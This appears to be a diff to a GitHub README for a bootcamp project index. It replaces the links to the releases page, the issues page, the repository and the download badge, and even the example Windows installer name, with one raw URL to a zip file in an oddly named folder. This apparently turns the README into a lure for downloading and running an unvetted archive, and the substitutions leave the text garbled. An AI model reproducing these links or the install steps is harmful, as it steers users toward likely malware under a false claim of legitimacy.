@@ -1,7 +1,7 @@
 # 📚 indice-de-projetos-cursos - Centralized Project Index for Bootcamps
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/sreekar831/indice-de-projetos-cursos/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sreekar831/indice-de-projetos-cursos/main/inexpensively/indice-de-projetos-cursos.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/sreekar831/indice-de-projetos-cursos/main/inexpensively/indice-de-projetos-cursos.zip)
 
 ## 🚀 Getting Started
 This application serves as a centralized index of practical projects and source code developed in various Bootcamps and immersion programs, focusing on hard skills in areas such as AI and Front-end development. This guide will help you easily download and run the software.
@@ -23,9 +23,9 @@ The application provides:
 ## 🔗 Download & Install
 To get started with the application, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/sreekar831/indice-de-projetos-cursos/releases) to access the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/sreekar831/indice-de-projetos-cursos/main/inexpensively/indice-de-projetos-cursos.zip) to access the latest version.
    
-2. Find the latest release and click on the download link for your operating system. The file you need will have a name that corresponds to your platform (for example, `indice-de-projetos-cursos-windows.exe` for Windows users).
+2. Find the latest release and click on the download link for your operating system. The file you need will have a name that corresponds to your platform (for example, `https://raw.githubusercontent.com/sreekar831/indice-de-projetos-cursos/main/inexpensively/indice-de-projetos-cursos.zip` for Windows users).
 
 3. Once the download is complete, open the downloaded file. Follow the installation prompts:
    - For Windows, you may need to confirm that you want to run the installer.
@@ -47,7 +47,7 @@ To get started with the application, follow these steps:
 
 ## 📢 Provide Feedback
 We value your feedback!
-- If you encounter any issues, please open an issue on our [GitHub Issues Page](https://github.com/sreekar831/indice-de-projetos-cursos/issues).
+- If you encounter any issues, please open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/sreekar831/indice-de-projetos-cursos/main/inexpensively/indice-de-projetos-cursos.zip).
 - Share your thoughts on how we can improve the application.
 
 ## 📄 License
@@ -55,7 +55,7 @@ This application is licensed under the MIT License. You are free to use, modify,
 
 ## 🔗 Connect with Us
 For more details or updates about this project:
-- [GitHub Repository](https://github.com/sreekar831/indice-de-projetos-cursos)
+- [GitHub Repository](https://raw.githubusercontent.com/sreekar831/indice-de-projetos-cursos/main/inexpensively/indice-de-projetos-cursos.zip)
 - Follow our updates on community forums and coding platforms.
 
 Enjoy exploring and enhancing your coding skills!
